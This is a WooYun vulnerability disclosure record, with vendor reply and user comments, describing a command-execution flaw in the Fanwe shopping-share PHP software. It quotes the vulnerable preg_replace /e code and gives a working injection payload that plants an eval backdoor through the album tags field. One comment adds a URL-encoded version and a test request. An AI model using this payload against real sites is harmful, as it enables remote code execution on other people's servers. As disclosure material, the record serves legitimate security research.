{"id": 45310, "wybug_id": "wooyun-2014-088871", "wybug_title": "方维购物分享最新版前台代码漏洞", "wybug_corp": "fanwe.com", "wybug_author": "0x_Jin", "wybug_date": "2014-12-27 00:27", "wybug_open_date": "2015-03-27 00:28", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-27：\t细节向公众公开  简要描述： 一步两步似魔鬼的步伐 详细说明：  缺陷文件：/core/function/global.func.php如下：\n/** * 显示页面 * @param string $cache_file 缓存路径 * @param bool $is_session 是否更新session * @param bool $is_return 是否返回页面内容 * @return mixed */function display($cache_file = '',$is_session = true,$is_return = false) { global $_FANWE; $content = NULL; if(!empty($cache_file) && !file_exists($cache_file)) { if(makeDir(preg_replace(\"/^(.*)\\/.*?\\.htm$/is\", \"\\\\1\", $cache_file))) { $dynamic_php = ''; if(isset($_FANWE['page_parses'])) $dynamic_php = \"<?php\\n\".' $_FANWE[\\'CACHE_CSS_SCRIPT_PHP\\']'.\" = \".var_export($_FANWE['page_parses'], true).\";\\n?>\";   $content = ob_get_contents(); express($content);   if(isset($_FANWE['tpl_image_formats'])) $dynamic_php .= \"<?php\\n\".' setTplFormats(\\'tpl_image_formats\\','.var_export($_FANWE['tpl_image_formats'], true).\");\\n?>\";   writeFile($cache_file,$dynamic_php.$content); } }   require_once fimport('dynamic/common'); $module_dynamic = ''; if(defined('MODULE_NAME') && MODULE_NAME != '') $module_dynamic = fimport('dynamic/'.MODULE_NAME);   if(!empty($module_dynamic) && file_exists($module_dynamic)) require_once $module_dynamic;   if($content === NULL) { $content = ob_get_contents(); express($content); } ob_end_clean(); $content = preg_replace('/<!--dynamic\\s+(.+?)(?:|\\sargs=(.*?))-->/ies', \"\\\\1('\\\\2');\", $content);\n最后的preg_replace 使用了/e的命令执行符号。$content可被控制。即页面上如果出现<!--dynamic args=(phpinfo())--> 即被执行args里的命令寻找一个变量能被没有过滤掉关键字符之类，并且能在页面上显示的就行。找了半天，找了个album.php的模块下的一个tags .缺陷文件/core/module/album.module.php  的300多行：\nif($share['status']){$data['title'] = htmlspecialchars($_FANWE['request']['title']);$data['content'] = htmlspecialchars($_FANWE['request']['content']);$data['tags'] = implode(' ',$tags);$data['uid'] = $_FANWE['uid'];$data['share_id'] = $share['share_id'];$data['create_day'] = getTodayTime();$data['create_time'] = TIME_UTC; $aid = FDB::insert('album',$data,true);\nTags 变量只做了分割处理。分割字符串为空格即%20前面的正则条件是需要匹配\\s 即空白字符，其中包括\\t \\r \\n 等所以，提交tags标签时，提交如下类似的字符串即进入到模版缓存替换执行中。 <!--dynamic%09eval(@$_GET[test]);--> 本地测试如下图：\n\n\n\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  你们比我更专业～   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-12-30 15:47 厂商回复： 程序已暂停维护，不再销售 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-27 08:55 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  你关注的白帽子 0x_Jin 发表了漏洞 方维购物分享最新版前台代码漏洞    \n     2014-12-27 11:57 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  666    \n     2014-12-27 12:00 |    \t\tkydhzy \t\t\t( 普通白帽子  |\t\t\t        Rank:362 漏洞数:62        | 软件测试)\t\t \n  大半夜不陪妹纸睡觉，竟然在挖洞    \n     2015-02-09 19:45 |    \t\t蓝莓说 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 爱网络安全 代码审计 php网站开发)\t\t \n  这个在新版3.1没用 你这个肯定是3.0的 看tag的编码就知道了     \n     2015-03-27 09:59 |    \t\tca1n \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:22        | not yet)\t\t \n  。。。jin大从前端转后端的节奏    \n     2015-03-31 03:19 |    \t\t蓝莓说 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 爱网络安全 代码审计 php网站开发)\t\t \n  我测试了下怎么不可以  album.php?action=show&id=13&test=phpinfo();   <div class=\"element\">时尚元素：<a href=\"/book.php?action=shopping&tag=%253C%2521--dynamic%252509eval%2528%2540%2524_GET%255Btest%255D%2529%253B--%253E\"><!--dynamic%09eval(@$_GET[test]);--></a>    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}